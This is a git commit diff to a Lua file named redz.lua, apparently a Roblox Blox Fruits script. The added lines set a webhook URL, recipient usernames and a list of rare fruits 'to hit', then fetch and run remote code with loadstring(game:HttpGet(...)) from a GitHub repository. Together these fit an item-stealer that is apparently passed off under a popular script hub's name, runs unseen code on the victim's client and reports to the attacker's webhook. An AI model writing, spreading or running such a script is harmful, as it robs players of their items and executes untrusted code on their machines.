b7e4a50748caf1c92584eef980b188f21581b25c
therealredz <mal362844@gmail.com>
2025-04-03 20:39:50 -0400

    Update redz.lua

--- redz.lua
+++ redz.lua
@@ -1,14 +1,8 @@
-Webhook = "" -- << Your Webhook
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=VW9DaHNoZll1Y2Yta0V3c1BUd1FydzpBaGJTYUNHSnJZQlowWnpwT001Z0J3bVlZZTgxTktCbHBIVEhqTzZ4M2IxYmpsSmZORjlEVlNxQ2lxVTdMVkpiQjhNY3QyMWtuNmVCdUNnSjhBVmJqM0YydWoyWGM1bE5fQkt4N2diVFUwT3F3alQySW1Yd3d3MndwY1NGSVY4ejVyVDhRNnBOQ0YtSWJsaU1iRGJ3ZV9xaDZFZTQ3OGhhQU9wRHRka1JuVWM" -- << Your Webhook
 Usernames = {"ytMarkian", "vintag992"} -- << Your username(-s).
-FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Dough-Dough", "T-Rex-T-Rex", "Gravity-Gravity", "Mammoth-Mammoth", "Control-Control"} -- << Fruits you want
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
 
 
-------------------
 
-Webhook = "" -- << Your Webhook
-Usernames = {"uruserhereorsmthidk", "somealtuserhere2"} -- << Your username(-s).
-FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Spirit-Spirit", "Gravity-Gravity", "T-Rex-T-Rex", "Mammoth-Mammoth", "Dough-Dough", "Dragon-Dragon", "Control-Control"} -- << Fruits you want
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
